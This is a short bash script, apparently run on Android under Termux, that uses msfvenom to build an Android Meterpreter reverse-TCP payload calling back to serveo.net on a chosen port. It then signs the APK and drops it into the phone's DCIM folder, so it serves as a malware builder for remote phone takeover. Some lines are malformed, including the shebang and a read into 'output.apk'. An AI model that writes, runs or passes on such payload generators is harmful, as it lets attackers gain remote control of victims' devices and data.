# !bin/bash
# payload gen on msf

read -p 'Enter port for serveo: ' port
read -p 'Enter output filename: ' output.apk
msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=$port R > Newtest.apk
apksigner autokey Newtest.apk Testing.apk
mv Testing.apk ~/storage/dcim/$output.apk
rm Newtest.apk autokey

#done